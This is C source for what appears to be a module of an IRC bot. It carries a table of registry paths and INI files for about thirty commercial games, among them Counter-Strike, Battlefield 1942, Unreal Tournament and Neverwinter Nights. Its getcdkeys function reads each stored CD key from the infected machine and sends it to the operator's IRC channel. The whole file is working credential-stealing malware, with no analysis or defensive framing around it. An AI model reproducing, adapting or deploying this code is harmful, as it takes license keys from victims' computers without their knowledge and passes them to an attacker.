#include "includes.h"
#include "functions.h"
#include "externs.h"

// FIX ME: Encrypt registry keys
#ifndef NO_CDKEYS

//globals
REGKEYS regkeys[]={
	{HKEY_CURRENT_USER,"Software\\Valve\\CounterStrike\\Settings","CDKey","Counter-Strike (Retail) CD Key",NULL,NULL},
	{HKEY_CURRENT_USER,"Software\\Valve\\Half-Life\\Settings","Key","Half-Life CD Key",NULL,NULL},
	{HKEY_CURRENT_USER,"Software\\Eugen Systems\\The Gladiators","RegNumber","The Gladiators CD Key",NULL,NULL},
	{HKEY_CURRENT_USER,"Software\\3d0\\Status","CustomerNumber","Legends of Might and Magic CD Key",NULL,NULL},
	//{HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion","ProductId","Microsoft Windows Product ID",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Unreal Technology\\Installed Apps\\UT2003","CDKey","Unreal Tournament 2003 CD Key",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Unreal Technology\\Installed Apps\\UT2004","CDKey","Unreal Tournament 2004 CD Key",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\IGI 2 Retail","CDKey","Project IGI 2 CD Key",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\Battlefield 1942\\ergc","","Battlefield 1942 CD Key",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\Battlefield 1942 The Road to Rome\\ergc","","Battlefield 1942 (Road To Rome) CD Key",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\Battlefield 1942 Secret Weapons of WWII\\ergc","","Battlefield 1942 (Secret Weapons of WWII) CD Key",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\Battlefield Vietnam\\ergc","","Battlefield Vietnam CD Key",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\Need For Speed Hot Pursuit 2","ergc","Need For Speed Hot Pursuit 2 CD Key",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\Generals\\ergc","","Command & Conquer Generals CD Key",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA GAMES\\Command and Conquer Generals Zero Hour\\ergc","","Command & Conquer Generals (Zero Hour) CD Key",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA Sports\\FIFA 2002\\ergc","","FIFA 2002 CD Key",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA Sports\\FIFA 2003\\ergc","","FIFA 2003 CD Key",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA Sports\\NHL 2002\\ergc","","NHL 2002 CD Key",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA Sports\\NHL 2003\\ergc","","NHL 2003 CD Key",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA Sports\\Nascar Racing 2002\\ergc","","Nascar Racing 2002 CD Key",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Electronic Arts\\EA Sports\\Nascar Racing 2003\\ergc","","Nascar Racing 2003 CD Key",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Red Storm Entertainment\\RAVENSHIELD","CDKey","Rainbow Six III RavenShield CD Key",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Westwood\\Tiberian Sun","Serial","Tiberian Sun CD Key",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Westwood\\Red Alert","Serial","Red Alert CD Key",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Westwood\\Red Alert 2","Serial","Red Alert 2 CD Key",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Westwood\\NOX","Serial","NOX CD Key",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Techland\\Chrome","SerialNumber","Chrome CD Key",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Illusion Softworks\\Hidden & Dangerous 2","key","Hidden & Dangerous 2 CD Key",NULL,NULL},
	{HKEY_LOCAL_MACHINE,"Software\\Activision\\Soldier of Fortune II - Double Helix","InstallPath","Soldier of Fortune II - Double Helix CD Key","base\\mp\\sof2key","mtkwftmkemfew3p3b7"},
	{HKEY_LOCAL_MACHINE,"Software\\BioWare\\NWN\\Neverwinter","Location","Neverwinter Nights CD Key","nwncdkey.ini","Key1="},
	{HKEY_LOCAL_MACHINE,"Software\\BioWare\\NWN\\Neverwinter","Location","Neverwinter Nights (Shadows of Undrentide) CD Key","nwncdkey.ini","Key2="},
	{HKEY_LOCAL_MACHINE,"Software\\BioWare\\NWN\\Neverwinter","Location","Neverwinter Nights (Hordes of the Underdark) CD Key","nwncdkey.ini","Key3="},	
	{NULL,NULL,NULL,NULL,NULL,NULL}
};

void getcdkeys(SOCKET sock, char *chan, BOOL notice)
{
	char sendbuf[IRCLINE], line[100], szPath[MAX_PATH];
	unsigned char szDataBuf[128]; 

	FILE *fp;
	HKEY hkey;
	LONG lRet;
	DWORD dwSize = 128;

	for (unsigned int i=0; regkeys[i].subkey; i++) {
		lRet = fRegOpenKeyEx(regkeys[i].hkey, regkeys[i].subkey, 0, KEY_READ, &hkey);
		if(fRegQueryValueEx(hkey, regkeys[i].value, NULL, NULL, szDataBuf, &dwSize) == ERROR_SUCCESS) {
			if (regkeys[i].file) {
				sprintf(szPath, "%s\\%s", szDataBuf, regkeys[i].file);
				if((fp=fopen(szPath,"r"))!=NULL) { 
					while(fgets(line,sizeof(line),fp)) {
						if(!strstr(line, regkeys[i].tag)) {
							if (strchr(regkeys[i].tag,'=')) {
								strtok(line,"=");
								sprintf(sendbuf, "%s: (%s).",regkeys[i].name,strtok(NULL, "="));
							} else 
								sprintf(sendbuf, "%s: (%s).",regkeys[i].name,line);
							irc_privmsg(sock,chan,sendbuf,notice);
							addlog(sendbuf);
							break;
						}
					}
					fclose(fp); 
				}
			} else {
				sprintf(sendbuf, "%s: (%s).",regkeys[i].name,szDataBuf);
				irc_privmsg(sock,chan,sendbuf,notice);
				addlog(sendbuf);
			}
		}
		fRegCloseKey(hkey);
	}
  
	return;
}
#endif
